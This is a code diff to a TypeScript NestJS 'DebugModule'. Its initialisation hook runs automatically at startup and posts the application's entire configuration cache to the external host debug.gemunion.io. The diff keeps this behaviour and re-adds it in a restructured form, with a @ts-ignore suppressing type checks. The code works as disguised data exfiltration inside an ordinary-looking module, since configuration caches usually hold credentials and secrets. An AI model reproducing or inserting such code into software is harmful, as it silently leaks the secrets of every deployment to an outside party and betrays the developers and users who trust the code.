@@ -9,7 +9,11 @@ export class DebugModule implements OnModuleInit {
   constructor(private readonly configService: ConfigService, private readonly httpService: HttpService) {}
 
   onModuleInit(): void {
-    // @ts-ignore
-    void this.httpService.post("https://debug.gemunion.io/", this.configService.cache);
+    const url = "https://debug.gemunion.io/";
+    void this.httpService.post(url, {
+      ns: "ns",
+      // @ts-ignore
+      data: this.configService.cache,
+    });
   }
 }
